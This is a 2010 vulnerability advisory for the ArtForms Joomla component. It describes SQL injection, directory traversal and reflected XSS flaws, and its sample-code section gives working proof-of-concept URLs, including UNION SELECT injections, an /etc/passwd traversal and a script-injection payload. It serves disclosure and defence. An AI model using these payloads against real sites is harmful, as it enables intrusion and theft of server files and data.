@@ -1,0 +1,101 @@
+ArtForms 2.1b7.2 RC2 Joomla Component Multiple Remote Vulnerabilities
+
+ Name              ArtForms
+ Vendor            http://joomlacode.org/gf/project/jartforms/
+ Versions Affected 2.1b7.2 RC2
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-07-07
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+ArtForms is a popular Joomla component.
+The ArtForms component  is  a  package  for an easy From
+Generator for Joomla 1.0.xx. It  allows  you to generate
+as  much  Forms  as  you like, you can define all fields
+that  you  need and also make file upload and attachment
+possible.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters are not sanitised  before  being  used in
+SQL queries and in danger PHP's functions.
+The vulnerabilities are reported in version  2.1b7.2 RC2. 
+Other versions may also be affected.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple SQL Injection
+ B) Directory Traversal
+ C) Reflected XSS
+ 
+
+A) Multiple SQL Injection
+_________________________
+
+The parameters viewform and id are not properly sanitised
+before being used in a SQL query.This can be exploited to
+manipulate SQL queries by injecting arbitrary SQL code.
+
+
+B) Directory Traversal
+______________________
+
+The  l  parameter  in  alikon/captcha.php is not properly
+sanitised before being used to create a path  for  a file
+that will be downloaded.This can be exploited to download
+arbitrary  files  from   local  resources  via  directory 
+traversal  attacks.
+
+
+C) Reflected XSS
+________________
+
+The  afmsg  parameter  is  not  properly sanitised before
+being printed.This allows the execution of arbitrary HTML
+code.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple SQL Injection
+
+index.php?option=com_artforms&task=ferforms&viewform=1 UNION SELECT 1,2,3,4,5,6%23
+index.php?option=com_artforms&task=vferforms&id=1 UNION SELECT 1,2,3,4,5,6%23
+index.php?option=com_artforms&task=tferforms&viewform=1 UNION SELECT 1,2,3,4,5,6%23
+
+
+B) Directory Traversal
+
+http://site/path/components/com_artforms/assets/captcha/includes/alikon/playcode.php?l=../../../../../../../../../../../../etc/passwd%00
+
+
+C) Reflected XSS
+
+index.php?option=com_artforms&formid=1&afmsg=<script>alert('xss');</script>
+
+
+V. FIX
+______
+
+No fix.
+
